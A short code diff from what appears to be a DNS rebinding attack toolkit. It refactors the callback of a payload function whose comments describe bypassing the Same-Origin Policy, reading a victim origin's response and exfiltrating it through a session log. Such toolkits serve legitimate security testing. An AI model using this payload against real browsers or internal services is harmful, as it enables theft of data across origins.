@@ -46,9 +46,11 @@ function rebindFrame () {
   // After this we'll have bypassed the Same-Origin policy
   session.triggerRebind().then(() => {
     // We can now read the response across origin...
-    network.get(session.baseURL, (code, headers, body) => {
-      // ... and exfiltrate it
-      session.log({code: code, headers: headers, body: body})
+    network.get(session.baseURL, {
+      successCb: (code, headers, body) => {
+        // ... and exfiltrate it
+        session.log({code: code, headers: headers, body: body})
+      }
     })
   })
 }
